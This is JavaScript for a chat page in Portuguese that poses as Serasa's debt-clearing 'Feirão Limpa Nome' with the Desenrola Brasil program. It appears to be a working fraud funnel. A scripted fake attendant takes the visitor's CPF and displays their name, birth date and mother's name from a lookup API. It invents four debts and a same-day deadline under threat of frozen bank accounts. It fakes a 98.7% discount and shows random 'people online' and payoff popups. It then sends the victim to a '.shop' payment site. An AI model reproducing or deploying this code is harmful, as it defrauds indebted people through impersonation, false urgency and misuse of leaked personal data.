// ===== VARIÁVEIS GLOBAIS =====
const chatBody = document.getElementById('chatBody');
const cpfInput = document.getElementById('cpfInput');
const inputArea = document.getElementById('inputArea');
let userData = null;
let acordoNum = '';
let valorProposta = '';

const nomes = ["Ricardo", "Ana", "Marcelo", "Beatriz", "Felipe", "Juliana", "Marcos", "Patrícia", "Sandra", "Lucas"];

// Durações reais dos áudios (fallback para mobile)
const AUDIO_DURATIONS = {
    '/assets/audio/1audio.mp3': 17,
    '/assets/audio/2audio.mp3': 36,
    '/assets/audio/3audio.mp3': 35,
    '/assets/audio/4audio.mp3': 31
};

// ===== MÁSCARA CPF =====
if (cpfInput) {
    cpfInput.addEventListener('input', function (e) {
        let v = e.target.value.replace(/\D/g, '');
        if (v.length > 11) v = v.slice(0, 11);
        if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
        else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
        else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, '$1.$2');
        e.target.value = v;
    });
    cpfInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') enviarCPF();
    });
}

// ===== NOTIFICACAO E SOM =====
let audioContextGlobal = null;

function initAudioContext() {
    if (!audioContextGlobal) {
        try {
            audioContextGlobal = new (window.AudioContext || window.webkitAudioContext)();
        } catch (e) {
            console.log('AudioContext nao suportado:', e);
        }
    }
    return audioContextGlobal;
}

function playNotificationSound() {
    try {
        const audioContext = initAudioContext();
        if (!audioContext) return;

        if (audioContext.state === 'suspended') {
            audioContext.resume();
        }

        const now = audioContext.currentTime;
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();

        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);

        oscillator.type = 'sine';
        oscillator.frequency.value = 800;
        gainNode.gain.setValueAtTime(0.5, now);
        gainNode.gain.exponentialRampToValueAtTime(0.01, now + 0.2);

        oscillator.start(now);
        oscillator.stop(now + 0.2);

        setTimeout(() => {
            try {
                const now2 = audioContext.currentTime;
                const osc2 = audioContext.createOscillator();
                const gain2 = audioContext.createGain();
                osc2.connect(gain2);
                gain2.connect(audioContext.destination);
                osc2.type = 'sine';
                osc2.frequency.value = 1000;
                gain2.gain.setValueAtTime(0.5, now2);
                gain2.gain.exponentialRampToValueAtTime(0.01, now2 + 0.2);
                osc2.start(now2);
                osc2.stop(now2 + 0.2);
            } catch (e) {
                console.log('Erro no segundo bip:', e);
            }
        }, 250);
    } catch (e) {
        console.log('Erro ao reproduzir som:', e);
    }
}

function showAttendantNotification() {
    const notification = document.createElement('div');
    notification.style.cssText = 'position: fixed; top: 60px; left: 50%; transform: translateX(-50%); background: linear-gradient(135deg, #e10075 0%, #c90068 100%); color: white; padding: 12px 24px; border-radius: 20px; box-shadow: 0 4px 20px rgba(225, 0, 117, 0.4); font-weight: bold; z-index: 2000; animation: slideDown 0.4s ease, slideUp 0.4s ease 3.6s forwards; font-size: 14px;';
    notification.textContent = 'Atendente Fernanda entrou na conversa';

    const style = document.createElement('style');
    style.textContent = '@keyframes slideDown { from { opacity: 0; transform: translateX(-50%) translateY(-20px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } } @keyframes slideUp { from { opacity: 1; transform: translateX(-50%) translateY(0); } to { opacity: 0; transform: translateX(-50%) translateY(-20px); } }';

    if (!document.querySelector('style[data-notification]')) {
        style.setAttribute('data-notification', 'true');
        document.head.appendChild(style);
    }

    document.body.appendChild(notification);

    setTimeout(() => {
        notification.remove();
    }, 4000);
}

// ===== HELPERS =====
function getTime() {
    const now = new Date();
    return now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
}

function scrollToBottom() {
    setTimeout(() => {
        chatBody.scrollTop = chatBody.scrollHeight;
    }, 100);
}

function gerarAcordoNum() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let r = '';
    for (let i = 0; i < 12; i++) r += chars[Math.floor(Math.random() * chars.length)];
    return r.slice(0, 3) + r.slice(3, 5) + r.slice(5, 7) + r.slice(7, 12) + 'E';
}

function gerarValor() {
    return '98,52';
}

function formatTime(s) {
    if (!s || !isFinite(s)) return '0:00';
    const m = Math.floor(s / 60);
    const sec = Math.floor(s % 60);
    return `${m}:${sec.toString().padStart(2, '0')}`;
}

// ===== TYPING INDICATOR =====
function showTyping() {
    const div = document.createElement('div');
    div.className = 'typing-indicator';
    div.id = 'typingIndicator';
    div.innerHTML = `
        <div class="typing-dots">
            <span></span><span></span><span></span>
        </div>
    `;
    chatBody.appendChild(div);
    scrollToBottom();
}

function hideTyping() {
    const el = document.getElementById('typingIndicator');
    if (el) el.remove();
}

// ===== LOADING INDICATOR =====
function showLoading() {
    const div = document.createElement('div');
    div.className = 'typing-indicator';
    div.id = 'loadingIndicator';
    div.innerHTML = `
        <div class="typing-dots">
            <span></span><span></span><span></span>
        </div>
    `;
    chatBody.appendChild(div);
    scrollToBottom();
}

function hideLoading() {
    const el = document.getElementById('loadingIndicator');
    if (el) el.remove();
}

// ===== ADD MESSAGE =====
function addMessage(side, content, isHTML = false) {
    hideTyping();
    const row = document.createElement('div');
    row.className = `msg-row ${side}`;

    if (isHTML) {
        row.innerHTML = `<div>${content}</div>`;
    } else {
        row.innerHTML = `
            <div class="msg-bubble">
                <span class="msg-content">${content}</span>
                <span class="msg-time">${getTime()}</span>
            </div>
        `;
    }
    chatBody.appendChild(row);
    scrollToBottom();
}

// ===== ADD AUDIO =====
function addAudio(audioSrc, onEndCallback = null) {
    hideTyping();
    const row = document.createElement('div');
    row.className = 'msg-row left';

    // Duração fallback hardcoded
    const fallbackDuration = AUDIO_DURATIONS[audioSrc] || 0;
    const fallbackDurText = formatTime(fallbackDuration);

    const bars = [];
    for (let i = 0; i < 25; i++) {
        const h = Math.floor(Math.random() * 20) + 5;
        bars.push(`<div class="bar" style="height:${h}px"></div>`);
    }

    const audioId = 'audio_' + Date.now();
    row.innerHTML = `
        <div class="audio-msg">
            <button class="audio-play-btn" id="${audioId}_btn">▶</button>
            <div style="flex:1">
                <div class="audio-wave">${bars.join('')}</div>
                <div class="audio-time"><span id="${audioId}_time">0:00</span> / <span id="${audioId}_dur">${fallbackDurText}</span></div>
            </div>
            <img src="/assets/img/hostAvatar.png" class="audio-avatar-small" alt="" onerror="this.style.display='none'">
            <audio id="${audioId}" preload="auto"></audio>
        </div>
    `;
    chatBody.appendChild(row);
    scrollToBottom();

    const audio = document.getElementById(audioId);
    const durEl = document.getElementById(`${audioId}_dur`);
    const timeEl = document.getElementById(`${audioId}_time`);
    const playBtn = document.getElementById(`${audioId}_btn`);

    // Usar a duração real do áudio OU o fallback
    let knownDuration = fallbackDuration;

    const updateDuration = () => {
        if (audio.duration && isFinite(audio.duration) && audio.duration > 0) {
            knownDuration = audio.duration;
            durEl.textContent = formatTime(knownDuration);
        }
    };

    audio.addEventListener('loadedmetadata', updateDuration);
    audio.addEventListener('durationchange', updateDuration);
    audio.addEventListener('canplay', updateDuration);
    audio.addEventListener('canplaythrough', updateDuration);

    audio.addEventListener('timeupdate', () => {
        updateDuration();
        timeEl.textContent = formatTime(audio.currentTime);
        const duration = knownDuration || 1;
        const pct = audio.currentTime / duration;
        const barElements = row.querySelectorAll('.bar');
        barElements.forEach((b, i) => {
            b.classList.toggle('active', i / barElements.length < pct);
        });
    });

    audio.addEventListener('ended', () => {
        playBtn.textContent = '▶';
        // Resetar barras
        row.querySelectorAll('.bar').forEach(b => b.classList.remove('active'));
        timeEl.textContent = '0:00';
        if (onEndCallback) onEndCallback();
    });

    audio.addEventListener('error', (e) => {
        console.log('Erro ao carregar áudio:', audioSrc, e);
    });

    // Botão de play/pause
    playBtn.addEventListener('click', () => {
        if (audio.paused) {
            audio.play().then(() => {
                playBtn.textContent = '❚❚';
                updateDuration();
            }).catch(e => console.log("Erro ao dar play:", e));
        } else {
            audio.pause();
            playBtn.textContent = '▶';
        }
    });

    // Definir source - garantir caminho absoluto
    const audioPath = audioSrc.startsWith('/') ? audioSrc : '/' + audioSrc;
    audio.src = audioPath;
    audio.load();

    // Tentar atualizar duração em múltiplos momentos
    setTimeout(updateDuration, 500);
    setTimeout(updateDuration, 1500);
    setTimeout(updateDuration, 3000);
}

function toggleAudio(id, btn) {
    const audio = document.getElementById(id);
    if (!audio) return;
    if (audio.paused) {
        audio.play().catch(e => console.log("Erro ao dar play:", e));
        btn.textContent = '❚❚';
    } else {
        audio.pause();
        btn.textContent = '▶';
    }
}

// ===== ADD IMAGE =====
function addImage(src) {
    hideTyping();
    const row = document.createElement('div');
    row.className = 'msg-row left';
    row.innerHTML = `
        <div class="msg-image"><img src="${src}" alt="" onerror="this.parentElement.style.display='none'"></div>
    `;
    chatBody.appendChild(row);
    scrollToBottom();
}

// ===== ADD BUTTONS =====
function addButtons(buttons) {
    const container = document.createElement('div');
    container.className = 'btn-container';
    container.id = 'btnContainer_' + Date.now();

    buttons.forEach(btn => {
        const b = document.createElement('button');
        b.className = `btn-option ${btn.class || 'btn-primary'}`;
        if (btn.large) b.classList.add('btn-large');
        b.textContent = btn.text;
        b.onclick = () => {
            addMessage('right', btn.text);
            container.remove();
            if (btn.action) btn.action();
        };
        container.appendChild(b);
    });

    chatBody.appendChild(container);
    scrollToBottom();
}

// ===== ADD CARD (HTML) =====
function addCard(html) {
    hideTyping();
    const row = document.createElement('div');
    row.className = 'msg-row left';
    row.innerHTML = `
        <div style="width:100%">${html}</div>
    `;
    chatBody.appendChild(row);
    scrollToBottom();
}

// ===== DELAY HELPER =====
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ===== API CALL =====
async function consultarCPF(cpf) {
    const cpfClean = cpf.replace(/\D/g, '');

    try {
        const res = await fetch(`/api/cpf/${cpfClean}`);
        if (!res.ok) {
            const errorData = await res.json().catch(() => ({}));
            throw new Error(errorData.error || 'CPF não encontrado');
        }
        return await res.json();
    } catch (error) {
        console.error('Erro ao consultar CPF:', error);
        throw error;
    }
}

// ===== NOTIFICAÇÕES =====
function initNotificacoes() {
    executarCicloPrincipal();
    setInterval(executarCicloPrincipal, 180000);
    cicloOnline();
    cicloAcordos();
}

function executarCicloPrincipal() {
    const oficial = document.getElementById('notifOficial');
    const feirao = document.getElementById('notifFeirao');
    if (!oficial || !feirao) return;
    setTimeout(() => {
        oficial.classList.add('show');
        setTimeout(() => oficial.classList.remove('show'), 6000);
        setTimeout(() => {
            feirao.classList.add('show');
            setTimeout(() => feirao.classList.remove('show'), 8000);
        }, 5000);
    }, 5000);
}

function cicloOnline() {
    const el = document.getElementById('notifOnline');
    const txt = document.getElementById('txtOnline');
    if (!el || !txt) return;
    if (Math.random() > 0.5) {
        txt.innerHTML = `<strong>${Math.floor(Math.random() * 50 + 120)}</strong> pessoas online.`;
    } else {
        txt.innerHTML = `<strong>${Math.floor(Math.random() * 10 + 5)}</strong> entraram agora.`;
    }
    el.classList.add('show');
    setTimeout(() => el.classList.remove('show'), 6000);
    setTimeout(cicloOnline, Math.random() * 10000 + 20000);
}

function cicloAcordos() {
    const el = document.getElementById('cardAcordo');
    const txt = document.getElementById('txtAcordo');
    if (!el || !txt) return;
    const nome = nomes[Math.floor(Math.random() * nomes.length)];
    const tipo = Math.floor(Math.random() * 4);
    switch (tipo) {
        case 0: txt.innerHTML = `${nome} finalizando acordo...`; break;
        case 1: txt.innerHTML = `+${Math.floor(Math.random() * 200 + 1400)} nomes limpos hoje`; break;
        case 2:
            let v9k = (Math.random() * (99 - 81) + 81).toFixed(2).replace('.', ',');
            txt.innerHTML = `${nome} quitou por R$ ${v9k}`;
            break;
        case 3:
            let v40k = (Math.random() * (450 - 370) + 370).toFixed(2).replace('.', ',');
            txt.innerHTML = `${nome} quitou por R$ ${v40k}`;
            break;
    }
    el.classList.add('show');
    setTimeout(() => el.classList.remove('show'), 5000);
    setTimeout(cicloAcordos, Math.random() * 10000 + 12000);
}

// ===== INÍCIO DO FUNIL =====
window.onload = function () {
    initNotificacoes();
    iniciarFunil();
};

async function iniciarFunil() {
    await delay(1000);
    addCard(`
        <div class="welcome-card">
            <div class="welcome-photos">
                <img src="/assets/img/Design-sem-nome.webp" alt="Equipe Serasa" onerror="this.style.display='none'">
            </div>
            <h3>Dúvidas? Fale Conosco</h3>
            <p>Costuma responder em até 10 minutos</p>
            <div class="online-dot">
                <div class="ponto-vivo"></div> Online agora
            </div>
        </div>
    `);

    await delay(2000);
    showTyping();
    await delay(3000);
    addMessage('left', 'Bem-vindo! Para encontrar uma proposta, informe seu CPF para verificação. 🔍');
}

async function enviarCPF() {
    const cpf = cpfInput.value.trim();
    if (cpf.replace(/\D/g, '').length !== 11) {
        alert('Por favor, digite um CPF válido com 11 dígitos.');
        return;
    }

    addMessage('right', cpf);
    inputArea.classList.add('hidden');

    showTyping();
    await delay(3000);

    try {
        userData = await consultarCPF(cpf);
    } catch (e) {
        hideTyping();
        addMessage('left', '❌ Não foi possível encontrar dados para este CPF. Verifique e tente novamente.');
        inputArea.classList.remove('hidden');
        return;
    }

    hideTyping();
    acordoNum = gerarAcordoNum();
    valorProposta = gerarValor();

    addMessage('left', `Olá, <strong>${userData.NOME}</strong>.<br>Bem-vindo ao atendimento oficial Serasa Limpa Nome. Seus dados estão protegidos e seguros conosco. 🔐<br>Um de nossos atendentes entrará em breve para melhor atendê-lo.`);

    await delay(2000);
    showLoading();
    await delay(3000);
    hideLoading();

    // Reproduzir som e mostrar notificacao
    playNotificationSound();
    showAttendantNotification();

    addMessage('left', '<strong>Atendente Fernanda</strong> entrou na conversa');

    await delay(1500);
    showTyping();
    await delay(3000);
    addMessage('left', 'Vou precisar confirmar alguns dados para sua segurança. Um momento, por favor... 🔐');

    await delay(2000);
    showTyping();
    await delay(2000);
    addAudio('/assets/audio/1audio.mp3');
    await delay(500);
    addButtons([{ text: 'CONTINUAR', class: 'btn-primary btn-large', large: true, action: etapaConfirmacaoDados }]);
}

async function etapaConfirmacaoDados() {
    showTyping();
    await delay(3000);
    addMessage('left', 'Por favor, confirme se os dados abaixo estão corretos:');
    await delay(1500);
    addCard(`
        <div class="card-dados">
            <div class="dado-row">
                <div class="dado-label">Nome completo:</div>
                <div class="dado-value">${userData.NOME}</div>
            </div>
            <div class="dado-row">
                <div class="dado-label">Data de nascimento:</div>
                <div class="dado-value">${userData.NASC}</div>
            </div>
            <div class="dado-row">
                <div class="dado-label">Nome da mãe:</div>
                <div class="dado-value">${userData.NOME_MAE}</div>
            </div>
        </div>
    `);
    await delay(2000);
    addButtons([
        { text: 'Sim, está correto.', class: 'btn-primary', action: etapaAcessoAprovado },
        {
            text: 'Não, está incorreto.', class: 'btn-secondary', action: () => {
                addMessage('left', 'Desculpe pelo inconveniente. Por favor, entre em contato com nosso suporte.');
            }
        }
    ]);
}

async function etapaAcessoAprovado() {
    showTyping();
    await delay(3000);
    addCard(`
        <div class="card-aprovado">
            <img src="/assets/img/d0136euzr7nwvv1c7qcny5un.webp" alt="Acesso Aprovado" onerror="this.style.display='none'">
        </div>
    `);
    await delay(3000);
    showTyping();
    await delay(2000);
    addMessage('left', 'Sua verificação de segurança foi concluída com sucesso! ✅');
    await delay(2000);
    showTyping();
    await delay(2000);
    addMessage('left', 'Confira as empresas parceiras que participam do <strong>Feirão Limpa Nome Serasa</strong>:');
    await delay(1500);
    addImage('/assets/img/hovfcj8cuwmvj0ugj84evm2r.jpg');
    await delay(3000);
    showTyping();
    await delay(2000);
    addMessage('left', `Este é o maior feirão limpa nome realizado neste ano de 2026. Ele chega com muitas novidades, em parceria com o programa <strong>Desenrola Brasil</strong>, trazendo ofertas lendárias com até 99% de desconto para você quitar todas as suas dívidas. <strong>São mais de 400 empresas participantes</strong>, entre elas, bancos, lojas, operadoras de telefonia e muito mais, todas com propostas que cabem no seu bolso.<br><br>Você deseja aproveitar o <strong>último dia do Feirão Limpa Nome Serasa</strong>?`);
    await delay(1500);
    addButtons([{ text: 'SIM, QUERO NEGOCIAR', class: 'btn-primary btn-large', large: true, action: etapaAnaliseSituacao }]);
}

async function etapaAnaliseSituacao() {
    showTyping();
    await delay(3000);
    addImage('/assets/img/dyui66pfh3scb2owapg1d9w1.png');
    await delay(2000);
    showTyping();
    await delay(3000);
    addMessage('left', `Analisando a situação do CPF <strong>${userData.CPF}</strong>... ⏳`);
    await delay(3000);
    showTyping();
    await delay(2000);
    addMessage('left', `Identificamos <strong>4 dívidas ativas</strong> no sistema. Os valores variam entre <strong>R$1.928,74 a R$9.878,23</strong> de dívida em seu CPF.<br><br>Você tem até <strong>HOJE</strong> para regularizar e evitar bloqueios judiciais em suas contas bancárias.<br><br>Situação do CPF: <strong>${userData.CPF}</strong><br><strong style="color:red;">NEGATIVADO 🚫</strong>`);
    await delay(2000);
    showTyping();
    await delay(2000);
    addMessage('left', `${userData.NOME}, você deseja verificar se existe algum <strong>acordo com desconto</strong> disponível para o seu CPF? 💰`);
    await delay(1500);
    addButtons([{ text: 'BUSCAR ACORDO DISPONÍVEL', class: 'btn-primary btn-large', large: true, action: etapaBuscarAcordo }]);
}

async function etapaBuscarAcordo() {
    showTyping();
    await delay(3000);
    addImage('/assets/img/ngohy7m8xrouu9tqtt3srtfz.jpg');
    await delay(2000);
    showTyping();
    await delay(3000);
    addMessage('left', 'O programa <strong>Desenrola Brasil</strong> do Serasa oferece as melhores condições de negociação, garantindo acordos exclusivos disponíveis para o seu CPF. 🇧🇷');
    await delay(2000);
    showTyping();
    await delay(4000);
    addMessage('left', `Verificando se existe acordo disponível para o CPF <strong>${userData.CPF}</strong>... 🔎`);
    await delay(3000);
    showTyping();
    await delay(3000);
    addMessage('left', '✅ <strong>Acordo encontrado!</strong> Temos uma proposta especial disponível para você!');
    await delay(1500);
    addButtons([{ text: 'VER MEU ACORDO', class: 'btn-primary btn-large', large: true, action: etapaVerAcordo }]);
}

async function etapaVerAcordo() {
    showTyping();
    await delay(2000);
    addAudio('/assets/audio/2audio.mp3');
    await delay(2000);
    showTyping();
    await delay(3000);
    addMessage('left', `🎉 Parabéns <strong>${userData.NOME}</strong>! Encontramos um <strong style="color: var(--rosa-serasa);">SUPER ACORDO DE 98,7% DE DESCONTO</strong> para você!`);
    await delay(2000);
    showTyping();
    await delay(2000);
    addCard(`
        <div class="acordo-card">
            <div class="acordo-header">Feirão Limpa Nome - Serasa Experian</div>
            <div style="margin-bottom:10px;">
                <span style="font-size:12px;color:#999;">Acordo confirmado:</span>
                <span class="acordo-num">${acordoNum}!</span>
            </div>
            <div style="font-size:13px;color:#555;line-height:1.6;">
                <div>Beneficiário(a): <strong>${userData.NOME}</strong></div>
                <div>Identificação (CPF): <strong>${userData.CPF}</strong></div>
                <div>Quitação de <strong>todas as dívidas</strong> em ativo no CPF.</div>
            </div>
        </div>
    `);
    await delay(3000);
    showTyping();
    await delay(2000);
    addMessage('left', `${userData.NOME}, você gostaria de realizar o seu acordo com <strong style="color: var(--rosa-serasa);">98,7% DE DESCONTO</strong> para quitar todas as suas dívidas e ter seu nome limpo novamente por apenas <strong style="color: var(--rosa-serasa);">R$ ${valorProposta}</strong>? 💳`);
    await delay(2000);
    addMessage('left', `<strong>890 Pontos no score.</strong>`);
    await delay(1000);
    addMessage('left', `Valor da proposta: <strong style="color: var(--rosa-serasa); font-size:18px;">R$ ${valorProposta}</strong>`);
    await delay(1500);
    addButtons([{ text: 'CONFIRMAR ACORDO E LIMPAR NOME', class: 'btn-primary btn-large', large: true, action: etapaConfirmarAcordo }]);
}

async function etapaConfirmarAcordo() {
    showTyping();
    await delay(3000);
    addMessage('left', '✅ <strong>Seu acordo foi confirmado com sucesso!</strong>');
    await delay(2000);
    addAudio('/assets/audio/3audio.mp3');
    await delay(2000);
    showTyping();
    await delay(3000);
    addCard(`
        <div class="card-dados">
            <div class="dado-row">
                <div class="dado-label">Nome completo:</div>
                <div class="dado-value">${userData.NOME}</div>
            </div>
            <div class="dado-row">
                <div class="dado-label">CPF:</div>
                <div class="dado-value">${userData.CPF}</div>
            </div>
            <div class="dado-row">
                <div class="dado-label">Data de nascimento:</div>
                <div class="dado-value">${userData.NASC}</div>
            </div>
            <div class="dado-row">
                <div class="dado-label">Nome da mãe:</div>
                <div class="dado-value">${userData.NOME_MAE}</div>
            </div>
            <div class="dado-row">
                <div class="dado-label">Score:</div>
                <div class="dado-value">105 Pontos - Baixo</div>
                <div class="score-bar"></div>
            </div>
        </div>
    `);
    await delay(2000);
    addCard(`
        <div class="acordo-card">
            <div class="acordo-header">Feirão Limpa Nome - Serasa Experian</div>
            <div style="margin-bottom:10px;">
                <span style="font-size:12px;color:#999;">Acordo confirmado:</span>
                <span class="acordo-num">${acordoNum}!</span>
            </div>
            <div style="font-size:13px;color:#555;line-height:1.6;">
                <div>Beneficiário(a): <strong>${userData.NOME}</strong></div>
                <div>Identificação (CPF): <strong>${userData.CPF}</strong></div>
                <div>Quitação de <strong>todas as dívidas</strong> em ativo no CPF.</div>
                <div style="margin-top:8px;"><strong>890 Pontos no score.</strong></div>
                <div style="margin-top:8px;">Valor da proposta: <strong style="color: var(--rosa-serasa); font-size:18px;">R$ ${valorProposta}</strong></div>
            </div>
        </div>
    `);
    await delay(2000);
    addButtons([{ text: 'CONTINUAR PARA O PAGAMENTO', class: 'btn-primary btn-large', large: true, action: etapaPagamento }]);
}

async function etapaPagamento() {
    showTyping();
    await delay(2000);
    addAudio('/assets/audio/4audio.mp3');
    await delay(2000);
    showTyping();
    await delay(3000);
    addMessage('left', `Perfeito, ${userData.NOME}! Estamos gerando seu link de pagamento seguro... 🔒`);
    await delay(3000);
    showTyping();
    await delay(2000);
    addMessage('left', `✅ Seu link de pagamento está pronto!<br><br>📋 <strong>Resumo do acordo:</strong><br>• Acordo: <strong>${acordoNum}</strong><br>• Valor: <strong style="color: var(--rosa-serasa);">R$ ${valorProposta}</strong><br>• Desconto: <strong>98,7%</strong><br>• Score após quitação: <strong>890 pontos</strong><br><br>Clique no botão abaixo para finalizar o pagamento:`);
    await delay(2000);
    addButtons([{
        text: 'Realizar pagamento do acordo e limpar meu nome', class: 'btn-primary btn-large', large: true, action: () => {
            addMessage('left', '🔄 Redirecionando para o pagamento seguro...');
            setTimeout(() => {
                window.location.href = 'https://www.consultoronlineenvandro.shop/';
            }, 1500);
        }
    }]);
}
